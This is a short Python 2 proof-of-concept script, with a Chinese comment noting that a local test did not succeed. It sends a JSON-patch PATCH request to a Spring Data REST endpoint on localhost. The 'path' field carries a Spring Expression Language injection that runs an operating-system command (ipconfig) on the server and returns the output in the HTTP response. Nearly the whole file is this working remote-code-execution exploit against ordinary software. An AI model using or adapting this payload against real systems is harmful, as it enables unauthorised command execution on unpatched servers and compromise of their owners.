# coding:utf-8
"""
本地测试没有成功
"""
import requests
import json

headers = {}
headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
headers['Content-Type'] = "application/json-patch+json"


def postdata():
    data = [{"op": "replace", "path": "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ipconfig\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]
    jsondata = json.dumps(data)
    # print jsondata, type(jsondata)
    url = 'http://localhost:8080/persons/2'
    res = requests.patch(url, headers=headers, data=jsondata)
    print res.text


if __name__ == '__main__':
    postdata()